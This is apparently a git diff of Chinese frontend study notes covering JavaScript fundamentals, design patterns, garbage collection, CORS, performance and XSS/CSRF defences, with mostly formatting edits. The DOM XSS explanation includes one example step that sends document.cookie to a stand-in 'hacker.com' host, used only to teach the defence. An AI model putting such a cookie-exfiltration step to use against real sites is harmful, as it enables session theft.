@@ -1,4 +1,5 @@
 - [数据类型](#数据类型)
+  
   - [数据类型检测](#数据类型检测)
     - [typeof](#typeof)
     - [instanceof](#instanceof)
@@ -9,47 +10,68 @@
     - [深拷贝](#深拷贝)
       - [手写浅拷贝](#手写浅拷贝)
       - [手写深拷贝](#手写深拷贝)
+
 - [this](#this)
+  
   - [内置函数](#内置函数)
     - [setTimeout](#settimeout)
     - [数组的forEach](#数组的foreach)
     - [div的点击](#div的点击)
   - [优先级](#优先级)
+
 - [原型](#原型)
+
 - [闭包](#闭包)
+  
   - [闭包的应用](#闭包的应用)
     - [模拟私有变量](#模拟私有变量)
     - [函数科里化](#函数科里化)
+
 - [防抖节流](#防抖节流)
+  
   - [防抖](#防抖)
   - [节流](#节流)
+
 - [异步](#异步)
+  
   - [异步发展的四个阶段](#异步发展的四个阶段)
   - [封装Ajax](#封装ajax)
   - [Promise](#promise)
+
 - [设计模式](#设计模式)
+  
   - [发布-订阅模式](#发布-订阅模式)
   - [观察者模式](#观察者模式)
   - [区分观察者模式和发布订阅模式](#区分观察者模式和发布订阅模式)
   - [单例模式](#单例模式)
+
 - [垃圾回收](#垃圾回收)
+  
   - [JS引擎的垃圾回收策略](#js引擎的垃圾回收策略)
     - [新生代——副垃圾回收器](#新生代副垃圾回收器)
     - [老生代—— 主垃圾回收器](#老生代-主垃圾回收器)
       - [全停顿](#全停顿)
+
 - [附录](#附录)
+  
   - [DOM相关](#dom相关)
+    
     - [DOM事件流](#dom事件流)
     - [事件对象](#事件对象)
       - [e.currentTarget](#ecurrenttarget)
       - [e.target](#etarget)
       - [e.preventDefault](#epreventdefault)
       - [e.stopPropagation](#estoppropagation)
+  
   - [跨域](#跨域)
+    
     - [JSONP](#jsonp)
     - [CORS](#cors)
+  
   - [浏览器缓存](#浏览器缓存)
+  
   - [性能优化](#性能优化)
+    
     - [请求](#请求)
       - [精灵图、内嵌的CSS/JS、base64图片](#精灵图内嵌的cssjsbase64图片)
       - [开启gzip](#开启gzip)
@@ -57,18 +79,25 @@
     - [域名分片](#域名分片)
     - [静态资源放到CDN](#静态资源放到cdn)
     - [升级HTTP2](#升级http2)
+  
   - [网络安全](#网络安全)
+    
     - [跨站脚本（Cross Site Scripting，XSS）](#跨站脚本cross-site-scriptingxss)
+      
       - [反射型](#反射型)
       - [DOM型](#dom型)
       - [存储型](#存储型)
       - [XSS防护](#xss防护)
         - [参数校验](#参数校验)
         - [字符转义](#字符转义)
+    
     - [跨站请求伪造（Cross-site Request Forgery，CSRF/XSRF）](#跨站请求伪造cross-site-request-forgerycsrfxsrf)
+      
       - [CSRF 攻击示例](#csrf-攻击示例)
+      
       - [CSRF 防御手段](#csrf-防御手段)
-## 数据类型
+        
+        ## 数据类型
 
 JavaScript是一门弱类型的动态语言。
 
@@ -92,11 +121,11 @@ JavaScript是一门弱类型的动态语言。
   + Function
 
 > Number：根据ECMAScript标准，JavaScript中只有一种数字类型，基于IEEE754标准的双精度64位二进制格式的值，-(2^53-1)到2^53-1。
->
+> 
 > Undefined：一个没有被赋值的变量会有一个默认值undefined，变量提升时的默认值也是undefined；
->
+> 
 > BigInt：JavaScript中一个全新的数字类型，可以用任意精度表示整数。使用BigInt，即使超出Number的安全整数范围限制，也可以安全的存储和操作。
->
+> 
 > Symbol：符号类型是唯一的，并且是不可修改的，通常用来作为Object的key。
 
 其中，前 7 种类型为基础类型，最后 1 种（Object）为引用类型，也是需要重点关注的，因为它在日常工作中是使用得最频繁，也是需要关注最多技术细节的数据类型。
@@ -149,7 +178,7 @@ let str = 'Covid-19'
 str instanceof String // false
 ```
 
-实现一个instanceof：
+实现一个`instanceof`：
 
 ```js
 function myInstanceof(left, right) {
@@ -467,26 +496,26 @@ box.onclick=function(){
 
 仅在对象内部生效，无法从外部触及，这样的变量，就是私有变量。
 
-> JS 最新的提案已经支持类似private的特性了，用`#`。ts更早就支持包括private、protect、static等关键字。
+> JS 最新的提案已经支持类似private的特性了，用`#`。ts更早就支持包括private、protect等关键字。
 
 ```js
 // 利用闭包生成IIFE，返回 User 类
 const User = (function() {
-	// 定义私有变量_password
-	let _password
-	class User {
-		constructor (username, password) {
-			// 初始化私有变量_password
-			_password = password
-			this.username = username
-		}
-		login() {
-			// 这里我们增加一行 console，为了验证 login 里仍可以顺利拿到密码
-			console.log(this.username, _password)
-			// 使用 fetch 进行登录请求，此处省略
-		}
-	}
-	return User
+    // 定义私有变量_password
+    let _password
+    class User {
+        constructor (username, password) {
+            // 初始化私有变量_password
+            _password = password
+            this.username = username
+        }
+        login() {
+            // 这里我们增加一行 console，为了验证 login 里仍可以顺利拿到密码
+            console.log(this.username, _password)
+            // 使用 fetch 进行登录请求，此处省略
+        }
+    }
+    return User
 })()
 
 let user = new User('xxx', 'yyy')
@@ -506,16 +535,16 @@ user.login() // xxx,yyy
 // 科里化
 function generateName(prefix) {
 return function(type) {
-	return function (itemName) {
-		return prefix + type + itemName
-		}
-	}
+    return function (itemName) {
+        return prefix + type + itemName
+        }
+    }
 }
 // 偏函数 
 function generateName(prefix) {
-	return function(type, itemName) {
-		return prefix + type + itemName
-	}
+    return function(type, itemName) {
+        return prefix + type + itemName
+    }
 }
 ```
 
@@ -529,26 +558,28 @@ function generateName(prefix) {
 
 以最后一次触发为准。场景：文本输入。
 
+**每次事件被触发时，都去清除之前的旧定时器，然后等待新的定时器**
+
 ```js
 // fn是我们需要包装的事件回调, delay是每次推迟执行的等待时间
 function debounce(fn, delay) {
-	// 定时器
-	let timer = null
-	// 将debounce处理结果当作函数返回
-	return function () {
-		// 保留调用时的this上下文
-		let context = this
-		// 保留调用时传入的参数
-		let args = arguments
-		// 每次事件被触发时，都去清除之前的旧定时器
-		if(timer) {
-			clearTimeout(timer)
-		}
-		// 设立新定时器
-		timer = setTimeout(function () {
-			fn.apply(context, args)
-		}, delay)
-	}
+    // 定时器
+    let timer = null
+    // 将debounce处理结果当作函数返回
+    return function () {
+        // 保留调用时的this上下文
+        let context = this
+        // 保留调用时传入的参数
+        let args = arguments
+        // 每次事件被触发时，都去清除之前的旧定时器
+        if(timer) {
+            clearTimeout(timer)
+        }
+        // 设立新定时器
+        timer = setTimeout(function () {
+            fn.apply(context, args)
+        }, delay)
+    }
 }
 // 用debounce来包装scroll的回调
 const better_scroll = debounce(() => console.log('触发了滚动事件'), 1000)
@@ -562,23 +593,23 @@ document.addEventListener('scroll', better_scroll)
 ```js
 // fn是我们需要包装的事件回调, interval是时间间隔的阈值
 function throttle(fn, interval) {
-	// last为上一次触发回调的时间
-	let last = 0
-	// 将throttle处理结果当作函数返回
-	return function () {
-		// 保留调用时的this上下文
-		let context = this
-		// 保留调用时传入的参数
-		let args = arguments
-		// 记录本次触发回调的时间
-		let now = +new Date()
-		// 判断上次触发的时间和本次触发的时间差是否小于时间间隔的阈值
-		if (now - last >= interval) {
-			// 如果时间间隔大于我们设定的时间间隔阈值，则执行回调
-			last = now;
-			fn.apply(context, args);
-		}
-	}
+    // last为上一次触发回调的时间
+    let last = 0
+    // 将throttle处理结果当作函数返回
+    return function () {
+        // 保留调用时的this上下文
+        let context = this
+        // 保留调用时传入的参数
+        let args = arguments
+        // 记录本次触发回调的时间
+        let now = new Date()
+        // 判断上次触发的时间和本次触发的时间差是否小于时间间隔的阈值
+        if (now - last >= interval) {
+            // 如果时间间隔大于我们设定的时间间隔阈值，则执行回调
+            last = now;
+            fn.apply(context, args);
+        }
+    }
 }
 // 用throttle来包装scroll的回调
 const better_scroll = throttle(() => console.log('触发了滚动事件'), 1000)
@@ -727,8 +758,6 @@ co(gen).then(function (){
 // 上面代码中，等到 Generator 函数执行结束，就会输出一行提示。
 ```
 
-
-
 ```js
 const co = require('co');
 let g = gen();
@@ -736,7 +765,6 @@ co(g).then(res =>{
   console.log(res);
 })
 ```
-
 
 这段代码比较简单，几行就完成了之前写的递归的那些操作。
 
@@ -812,11 +840,7 @@ JS 异步解决方案的发展历程以及优缺点。
   优点：代码清晰，不用像Promise 写一大堆then 链，处理了回调地狱的问题
   缺点：await 将异步代码改造成同步代码，如果多个异步操作没有依赖性而使用await 会导致性能上的降低。
 
-
-
 各种手写
-
-
 
 ## 设计模式
 
@@ -832,30 +856,30 @@ JS 异步解决方案的发展历程以及优缺点。
 
 ```js
 class EventEmitter {
-	constructor() {
-		// handlers是一个map，用于存储事件与回调之间的对应关系
-		this.handlers = {}
-	}
-	// on方法用于安装事件监听器，它接受目标事件名和回调函数作为参数
-	on(eventName, cb) {
-		// 先检查一下目标事件名有没有对应的监听函数队列
-		if (!this.handlers[eventName]) {
-		// 如果没有，那么首先初始化一个监听函数队列
-		this.handlers[eventName] = []
-	}
-	// 把回调函数推入目标事件的监听函数队列里去
-	this.handlers[eventName].push(cb)
-	}
-	// emit方法用于触发目标事件，它接受事件名和监听函数入参作为参数
-	emit(eventName, ...args) {
-		// 检查目标事件是否有监听函数队列
-		if (this.handlers[eventName]) {
-			// 如果有，则逐个调用队列里的回调函数
-			this.handlers[eventName].forEach((callback) => {
-				callback(...args)
-			})
-		}
-	}
+    constructor() {
+        // handlers是一个map，用于存储事件与回调之间的对应关系
+        this.handlers = {}
+    }
+    // on方法用于安装事件监听器，它接受目标事件名和回调函数作为参数
+    on(eventName, cb) {
+        // 先检查一下目标事件名有没有对应的监听函数队列
+        if (!this.handlers[eventName]) {
+        // 如果没有，那么首先初始化一个监听函数队列
+        this.handlers[eventName] = []
+        }
+        // 把回调函数推入目标事件的监听函数队列里去
+        this.handlers[eventName].push(cb)
+    }
+    // emit方法用于触发目标事件，它接受事件名和监听函数入参作为参数
+    emit(eventName, ...args) {
+        // 检查目标事件是否有监听函数队列
+        if (this.handlers[eventName]) {
+            // 如果有，则逐个调用队列里的回调函数
+            this.handlers[eventName].forEach((callback) => {
+                callback(...args)
+            })
+        }
+    }
     // 移除订阅
     off(eventName, cb){
         if(this.handlers[eventName]){
@@ -897,15 +921,11 @@ class Observer {
 }
 ```
 
-
-
 ### 区分观察者模式和发布订阅模式
 
 一般来讲发布订阅者模式会有一个全局的事件总线，作为发布、订阅任务的调度中心；会维护一个hashmap，事件名作为key，订阅事件的回调函数构成的数组作为value。
 
 观察者模式中去掉了事件总线的概念，发布者和观察者直连，观察者订阅发布者，发布者发生改变也会通知观察者。
-
-
 
 ### 单例模式
 
@@ -916,7 +936,7 @@ class Observer {
 1. **实例化一个全局唯一的元素，确保样式一致**。比如说全局唯一的 Alert、全局唯一的 Modal 等等。
 
 2. 实例化一个全局唯一的类。比如说上文提及的全局事件总线：一个上下文里只能有一个全局时间总线，否则就
-不叫“总线”了。
+   不叫“总线”了。
 
 ```js
 // 实现单例模式的思路就是闭包
@@ -930,15 +950,15 @@ class Observer {
 </head>
 <style>
 #modal {
-	height: 300px;
-	width: 300px;
-	line-height: 300px;
-	position: fixed;
-	left: 50%;
-	top: 50%;
-	transform: translate(-50%, -50%);
-	border: 1px solid red;
-	text-align: center;
+    height: 300px;
+    width: 300px;
+    line-height: 300px;
+    position: fixed;
+    left: 50%;
+    top: 50%;
+    transform: translate(-50%, -50%);
+    border: 1px solid red;
+    text-align: center;
 }
 </style>
 <body>
@@ -950,34 +970,32 @@ class Observer {
 
 // 点击打开按钮展示模态框
 document.getElementById('open').addEventListener('click', function() {
-	// 未点击则不创建modal实例，避免不必要的内存占用;此处不用 new Modal 的形式调用也可以，和 Storage 同理
-	const modal = createModal()
-	modal.style.display = 'block'
+    // 未点击则不创建modal实例，避免不必要的内存占用;此处不用 new Modal 的形式调用也可以，和 Storage 同理
+    const modal = createModal()
+    modal.style.display = 'block'
 })
 // 点击关闭按钮隐藏模态框
 document.getElementById('close').addEventListener('click', function() {
-	const modal = createModal()
-	if(modal) {
-		modal.style.display = 'none'
-	}
+    const modal = createModal()
+    if(modal) {
+        modal.style.display = 'none'
+    }
 })
 // 核心逻辑，这里采用了闭包思路来实现单例模式
 const createModal = (function() {
-	let modal = null
-	return function() {
-		if(!modal) {
-			modal = document.createElement('div')
-			modal.innerHTML = 'Modal模态框，全局唯一'
-			modal.id = 'modal'
-			modal.style.display = 'none'
-			document.body.appendChild(modal)
-		}
-		return modal
-	}
+    let modal = null
+    return function() {
+        if(!modal) {
+            modal = document.createElement('div')
+            modal.innerHTML = 'Modal模态框，全局唯一'
+            modal.id = 'modal'
+            modal.style.display = 'none'
+            document.body.appendChild(modal)
+        }
+        return modal
+    }
 })()
 ```
-
-
 
 ## 垃圾回收
 
@@ -1001,7 +1019,7 @@ JavaScript 中的垃圾收集策略有标记清除（最常用），引用计数
 
 大多数的对象最开始都会被分配在新生代，该存储空间相对较小，只有几十 MB，分为两个空间：from 空间和 to 空间。
 
-程序中声明的对象首先会被分配到 from 空间，当进行垃圾回收时，会先将 from 空间中存活的的对象（存活对象可以理解为被引用的对象）复制到 to 空间进行保存，对未存活的对象空间进行回收。当复制完成后，from 空间和 to 空间进行调换，to 空间会变为新的 from 空间，原来的 from 空间则变为 to 空间，这种算法称之为 **“Scavenge”。**  再有新的对象，就会继续这样操作，新的对象放到from区域，再垃圾回收。
+程序中声明的对象首先会被分配到 from 空间，当进行垃圾回收时，会先将 from 空间中存活的对象（存活对象可以理解为被引用的对象）复制到 to 空间进行保存，对未存活的对象空间进行回收。当复制完成后，from 空间和 to 空间进行调换，to 空间会变为新的 from 空间，原来的 from 空间则变为 to 空间，这种算法称之为 **“Scavenge”。**  再有新的对象，就会继续这样操作，新的对象放到from区域，再垃圾回收。
 
 同时，副垃圾回收器还会采用**对象晋升策略**，也就是移动那些经过两次垃圾回收依然还存活的对象到老生代中。
 
@@ -1011,7 +1029,7 @@ JavaScript 中的垃圾收集策略有标记清除（最常用），引用计数
 
 新生代中多次回收仍然存活的对象会被转移到空间较大的老生代。因为老生代空间较大，如果回收方式仍然采用 Scanvage 算法来频繁复制对象，那性能开销就太大了。
 
-所以老生代采用的是另一种**“标记清除”（Mark-Sweep）**的方式来回收未存活的对象空间。
+所以老生代采用的是另一种 **“标记清除”（Mark-Sweep）** 的方式来回收未存活的对象空间。
 
 这种方式主要分为标记和清除两个阶段。标记阶段会遍历堆中所有对象，并对**可以访问到的对象进行标记**；清除阶段则是对未标记对象的空间进行回收。
 
@@ -1022,8 +1040,6 @@ JavaScript 中的垃圾收集策略有标记清除（最常用），引用计数
 ##### 全停顿
 
 不过由于JavaScript 是运行在主线程之上的，一旦执行垃圾回收算法，都需要将正在执行的JavaScript 脚本暂停下来，待垃圾回收完毕后再恢复脚本执行。如果老生代存放的活动对象多，处理耗时长（**全停顿**），为减少卡顿的时间，引入**增量标记**的概念。先标记堆内存中的一部分对象，然后暂停，将执行权重新交给JS主线程，待主线程任务执行完毕后再从原来暂停标记的地方继续标记，直到标记完整个堆内存。
-
-
 
 ## 附录
 
@@ -1083,7 +1099,7 @@ e.stopPropagation()
 
 #### JSONP
 
-原理：script标签跨域引用JS文件不会受到浏览器同源策略的限制。
+原理：`script`标签跨域引用`JS`文件不会受到浏览器同源策略的限制。
 
 优势：兼容性好，IE低版本不能用CORS，但可以使用JSONP
 
@@ -1115,6 +1131,12 @@ JSONP("http://suggest.taobao.com/sug",{code:"utf-8",q:"123"}).then((data)=>{cons
 
 #### CORS
 
+> **CORS 需要浏览器和后端同时支持。IE 8 和 9 需要通过 XDomainRequest 来实现**
+> 
+> 浏览器会自动进行 CORS 通信，实现 CORS 通信的关键是后端。只要后端实现了 CORS，就实现了跨域。
+> 
+> **服务端设置 Access-Control-Allow-Origin 就可以开启 CORS**。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。
+
 跨域资源共享，利用http头部字段让浏览器与服务器进行沟通，从而决定请求是否成功。
 
 分为简单请求与非简单请求：
@@ -1125,9 +1147,13 @@ JSONP("http://suggest.taobao.com/sug",{code:"utf-8",q:"123"}).then((data)=>{cons
 
 + GET/POST/HEAD
 
-+ Accept/Accept-language/Content-language/Content-type
++ Content-Type 的值仅限于下列三者之一：
+  
+  - text/plain
+  - multipart/form-data
+  - application/x-www-form-urlencoded
 
-对于简单请求，在请求发出后，会自动的在头部字段添加origin，说明请求的源。服务器在拿到请求后，在回应时需要设置`Access-Control-Allow-Origin`字段，说明可以访问该资源的源，若origin在此范围内，就可以拿到该资源。
+对于简单请求，在请求发出后，会自动的在头部字段添加`origin`，说明请求的源。服务器在拿到请求后，在回应时需要设置`Access-Control-Allow-Origin`字段，说明可以访问该资源的源，若`origin`在此范围内，就可以拿到该资源。
 
 ```js
 // console.log(request.headers["referer"])
@@ -1136,15 +1162,17 @@ response.setHeader("Access-Control-Allow-Origin","允许的源")
 
 **非简单请求**
 
-对于非简单请求，会先发一条options请求作为预检请求，询问当前域名是否被允许，以及可以使用的http字段和头信息。然后再发出正式的CORS请求或者报错。
+对于非简单请求，会先发一条`options`请求作为预检请求，添加了 1 个请求头部字段 `Access-Control-Request-Method`，值为跨域请求所使用的请求方法；如果这个跨域请求还有其他字段，还会在请求头部添加了` Access-Control-Request-Headers` 字段，值为跨域请求添加的请求头部字段。
 
-+ 在预检请求的响应返回后，若请求不满足响应头的条件，则触发XMLHttpRequest的onErrror方法；
+在服务端收到预检请求后，除了在响应头部添加 `Access-Control-Allow-Origin` 字段之外，至少还会添加` Access-Control-Allow-Methods` 字段来告诉浏览器服务端允许的请求方法，并返回 204 状态码。
 
-+ 若满足响应头条件，则正常发送CORS请求，同简单请求一样，浏览器自动加上origin字段，服务端响应返回Access-Control-Allow-Origin
+在上面的例子中，服务端还根据浏览器的 `Access-Control-Request-Headers` 字段回应了一个 `Access-Control-Allow-Headers` 字段，来告诉浏览器服务端允许的请求头部字段。
+
++ 在预检请求的响应返回后，若请求不满足响应头的条件，则触发`XMLHttpRequest`的`onErrror`方法；
+
++ 若满足响应头条件，则正常发送CORS请求，同简单请求一样，浏览器自动加上`origin`字段，服务端响应返回`Access-Control-Allow-Origin`
 
 ### 浏览器缓存
-
-
 
 ### 性能优化
 
@@ -1168,15 +1196,15 @@ response.setHeader("Access-Control-Allow-Origin","允许的源")
 对于减少请求次数来说，我们可以用精灵图、内嵌的CSS/JS、base64图片
 
 > base64图片是一种编码方式，可以直接写进css/html，浏览器可以识别，而不用再去请求一次图片。
->
+> 
 > Base64 并非一种图片格式，而是一种编码方式。Base64 和雪碧图一样，是作为小图标解决方案而存在的。
->
+> 
 > 每次加载图片，都是需要单独向服务器请求这个图片对应的资源的——这也就意味着一次 HTTP 请求的开销。
->
+> 
 > **Base64 是一种用于传输 8Bit 字节码的编码方式，通过对图片进行 Base64 编码，我们可以直接将编码结果写入 HTML 或者写入 CSS，从而减少 HTTP 请求的次数。**
->
+> 
 > 可以直接用这个字符串替换掉上文中的链接地址。你会发现浏览器原来是可以理解这个字符串的，它自动就将这个字符串解码为了一个图片，而不需再去发送 HTTP 请求。
->
+> 
 > > 推荐的是利用 webpack 来进行 Base64 的编码——webpack 的 [url-loader](https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Fwebpack-contrib%2Furl-loader) ，它除了具备基本的 Base64 转码能力，还可以结合文件大小，帮我们判断图片是否有必要进行 Base64 编码。
 
 ##### 开启gzip
@@ -1230,7 +1258,7 @@ const compression = require('compression')
 app.use(compression())
 ```
 
-####  CSS 放在文件头部，JavaScript 文件放在底部
+#### CSS 放在文件头部，JavaScript 文件放在底部
 
 所有放在 head 标签里的 CSS 和 JS 文件都会堵塞渲染（CSS 不会阻塞 DOM 解析、JS阻塞解析）。如果这些 CSS 和 JS 需要加载和解析很久的话，那么页面就空白了。所以 JS 文件要放在底部，等 HTML 解析完了再加载 JS 文件。
 
@@ -1241,9 +1269,9 @@ app.use(compression())
 另外，JS 文件也不是不可以放在头部，只要给 script 标签加上 defer 属性就可以了，异步下载，延迟执行。
 
 > defer 掘金中用的多，作用是延迟：当浏览器遇到带有 defer 属性的 script 时，获取该脚本的网络请求也是异步的，不会阻塞浏览器解析 HTML，一旦网络请求回来之后，**如果此时 HTML 还没有解析完，浏览器不会暂停解析并执行 JS 代码，而是等待 HTML 解析完毕再执行 JS 代码**
->
+> 
 > async 七牛用的多，异步，当浏览器遇到带有 async 属性的 script 时，请求该脚本的网络请求是异步的，不会阻塞浏览器解析 HTML，一旦网络请求回来之后，**如果此时 HTML 还没有解析完，浏览器会暂停解析，先让 JS 引擎执行代码，执行完毕后再进行解析**
->
+> 
 > > 如果存在多个 defer script 标签，浏览器（IE9及以下除外）会保证它们按照在 HTML 中出现的顺序执行，不会破坏 JS 脚本之间的依赖关系。
 
 #### 域名分片
@@ -1283,12 +1311,10 @@ CDN 的核心点有两个，一个是**缓存**，一个是**回源**。
 ![img](https:////p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/67c19972e7dd4ae0840a0f838dd6a017~tplv-k3u1fbpfcp-zoom-1.image)
 
 > > Cookie 是紧跟域名的。同一个域名下的所有请求，都会携带 Cookie。大家试想，如果我们此刻仅仅是请求一张图片或者一个 CSS 文件，我们也要携带一个 Cookie 跑来跑去（关键是 Cookie 里存储的信息我现在并不需要），这是一件多么劳民伤财的事情。Cookie 虽然小，请求却可以有很多，随着请求的叠加，这样的不必要的 Cookie 带来的开销将是无法想象的……
->
+> 
 > 同一个域名下的请求会不分青红皂白地携带 Cookie，而静态资源往往并不需要 Cookie 携带什么认证信息。把静态资源和主页面置于不同的域名下，完美地避免了不必要的 Cookie 的出现！
 
 #### 升级HTTP2
-
-
 
 ### 网络安全
 
@@ -1349,6 +1375,7 @@ DOM 型 XSS 可以看作一种特殊的反射型 XSS，它也是一种非持久�
 ```
 
 + 引导用户点击：http://server.com/index.php?search=<script></script>
+
 + 浏览器拼接search参数并修改DOM
 
 + 浏览器请求：http://hacker.com?cookie=document.cookie
@@ -1368,8 +1395,6 @@ DOM 型 XSS 可以看作一种特殊的反射型 XSS，它也是一种非持久�
 ###### 字符转义
 
 **字符转义。**对于一些特殊符号，比如“<”“>”“&”“"”“'”“/”，我们需要对其进行转义，后端接收这些代码时候的转义存储，前端在显示的时候，再把它们转成原来的字符串进行显示。
-
-
 
 对于用户输入的字符串内容，不要使用 eval、new Function 等动态执行字符串的方法，也不要将这些字符串通过 innerHTML、outerHTML、document.write() 方式直接写到 HTML 中。对于非客户端 cookie，比如保存用户凭证的 session，将其设置为 http only，避免前端访问 cookie。
 
@@ -1419,48 +1444,3 @@ CSRF 攻击就是在受害者毫不知情的情况下以受害者名义伪造请
 
 > CSRF 是通过自动提交表单的形式来发起攻击的。所以，在前面转账的例子中，黑客可以通过抓包分析出 http://bank.com/transfer 这个接口所需要的参数，从而构造对应的 form 表单。因此，我们只需要在这个接口中，加入一个黑客无法猜到的参数，就可以有效防止 CSRF 了。这就是 CSRF Token 的工作原理。
 > 因为 CSRF Token 是每次用户正常访问页面时，服务端随机生成返回给浏览器的。所以，每一次正常的转账接口调用，都会携带不同的 CSRF Token。黑客没有办法进行提前猜测，也就没有办法构造出正确的表单了。
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
